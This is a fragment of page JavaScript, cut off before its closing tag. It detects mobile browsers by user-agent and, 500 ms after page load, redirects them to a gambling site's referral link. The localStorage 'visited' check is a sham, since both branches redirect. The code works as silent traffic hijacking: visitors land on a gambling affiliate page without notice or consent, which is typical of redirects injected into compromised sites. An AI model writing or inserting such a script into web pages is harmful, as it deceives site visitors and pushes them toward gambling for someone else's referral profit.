  <script>
    function isMobile() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      return /android|iphone|ipad|ipod|windows phone|blackberry|mobile/i.test(ua);
    }

    function redirectToRainbet() {
      const referralURL = "https://rainbet.com/?r=thankyou";
      const hasVisited = localStorage.getItem("rainbetReferralVisited");

      if (!hasVisited) {
        localStorage.setItem("rainbetReferralVisited", "true");
        window.location.href = referralURL;
      } else {
        window.location.href = referralURL;
      }
    }

    window.onload = function () {
      if (isMobile()) {
        setTimeout(redirectToRainbet, 500);
      }
    };
